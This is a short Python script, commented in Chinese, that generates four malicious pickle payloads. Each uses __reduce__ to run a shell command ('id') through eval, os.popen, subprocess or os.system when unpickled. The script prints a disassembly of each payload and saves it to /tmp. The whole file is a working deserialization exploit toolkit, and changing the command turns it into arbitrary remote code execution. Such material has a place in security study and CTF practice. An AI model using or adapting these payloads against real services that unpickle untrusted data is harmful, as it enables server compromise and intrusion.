import pickle
import pickletools
import os

# 方法1: 使用 __reduce__ 返回值
class RCE1:
    def __reduce__(self):
        return (eval, ("__import__('os').popen('id').read()",))

# 方法2: 使用 subprocess
class RCE2:
    def __reduce__(self):
        return (__import__('subprocess').check_output, (['id'],))

# 方法3: 使用 commands (Python 2)
class RCE3:
    def __reduce__(self):
        return (eval, ("__import__('os').system('id')",))

# 方法4: 使用 os.system 直接
class RCE4:
    def __reduce__(self):
        return (os.system, ('id',))

for i, cls in enumerate([RCE1, RCE2, RCE3, RCE4], 1):
    payload = pickle.dumps(cls())
    print(f"\n=== Method {i} ===")
    pickletools.dis(payload)
    with open(f'/tmp/rce{i}.pkl', 'wb') as f:
        f.write(payload)
    print(f"Saved to /tmp/rce{i}.pkl")
